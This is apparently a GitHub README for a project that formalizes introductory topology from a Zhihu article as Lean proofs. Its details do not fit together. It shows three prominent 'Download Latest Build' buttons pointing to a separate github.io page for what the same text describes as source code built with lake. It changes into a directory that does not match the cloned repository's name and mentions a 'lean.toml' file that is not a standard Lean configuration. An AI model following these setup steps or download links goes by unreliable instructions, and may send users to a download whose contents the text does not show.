# LeanTopology - Mathematics 2026

> **A machine-checked formalization of introductory topology in Lean.** LeanTopology turns the intuitive material presented in sumeragi693's Zhihu article into precise definitions and verified proofs, creating an interactive reference for mathematicians and Lean learners.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michael-wardaki4169/lean-topology-proofs?style=flat-square)](https://github.com/michael-wardaki4169/lean-topology-proofs)

---

<p align="center">
  <a href="https://michael-wardaki4169.github.io/lean-topology-proofs/">
    <img src="https://img.shields.io/badge/Download-LeanTopology%20Latest-brightgreen?style=for-the-badge" alt="Download LeanTopology">
  </a>
</p>

> **[Download LeanTopology v1.0](https://michael-wardaki4169.github.io/lean-topology-proofs/)**

---

[Download Latest Build](https://michael-wardaki4169.github.io/lean-topology-proofs/)

---

## Project Overview

LeanTopology presents topology in a form that can be inspected and checked by Lean rather than left only at the level of informal exposition. The topology material from sumeragi693's Zhihu series is represented as Lean definitions, examples, and proofs, covering ideas such as topological spaces, continuity, and related properties. It can support newcomers learning formal mathematics while also giving experienced Lean users a focused collection of topology examples.

The formalization aims to retain the intuition of the source material without sacrificing mathematical precision. Definitions and theorems are expressed in Lean syntax, so readers can follow proof steps, inspect dependencies, and observe how each result follows from foundational properties. As a result, the project functions both as a translation of the article and as a practical learning resource.

---

## What Is Included

- Lean implementations of fundamental notions such as open sets, closed sets, and neighborhoods
- An executable formal translation of sumeragi693's Zhihu article
- Proofs that can be explored interactively theorem by theorem
- Explanatory comments and annotations connecting informal ideas with formal statements
- A section layout that follows the organization of the original article
- Verification through Lean's type theory and tactic framework
- A useful resource for independent study, teaching, and consultation
- An open codebase that can be expanded with additional topology material

---

## Installation

Download the repository, then enter the project directory:

```bash
git clone https://github.com/michael-wardaki4169/lean-topology-proofs.git
cd LeanTopology
```

Open the project in VS Code with the Lean 4 extension, or run `lake build` to compile the project and check its proofs.

---

## Working with the Formalization

The complete development is available in `LeanTopology.lean`. Its labeled sections correspond to the progression of the original article. To inspect an individual proof interactively:

1. Open the file in VS Code with Lean 4 support enabled.
2. Put the cursor inside a `theorem` or `example` block.
3. Follow the proof state and available information in the Lean Infoview.

For a project-wide verification pass, run:

```bash
lake build
```

---

## Configuration and Extension

LeanTopology does not require extra configuration. The definitions live in the Lean source files, while the Lean environment settings, including `lean.toml`, are supplied at the repository root.

To extend the project, create additional `.lean` files in `src/` and import them from the main file.

---

## Requirements

- **Lean 4** (latest stable release)
- **Lake**, the Lean build system included with Lean 4
- **VS Code** with the Lean 4 extension (recommended)
- **Storage**: approximately 10 MB for the source and dependencies
- **Platform**: any operating system supported by Lean 4, including Windows, macOS, and Linux

---

## Frequently Asked Questions

**Q: Is prior Lean experience required?**  
A: It is helpful, but not mandatory. The project structure, comments, and annotations are intended to help mathematicians who are beginning formalization.

**Q: What determines the update schedule?**  
A: Changes may follow revisions to the original Zhihu article or improvements to the formal development. Consult the repository for release notes.

**Q: May I contribute additional topology proofs?**  
A: Yes. The project is intended to grow. Add your definitions or theorems in new files and submit a pull request.

**Q: How should I report an incorrect proof?**  
A: Open an issue naming the affected theorem and explaining the problem. Contributions and corrections are welcome.

---

## License

LeanTopology is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
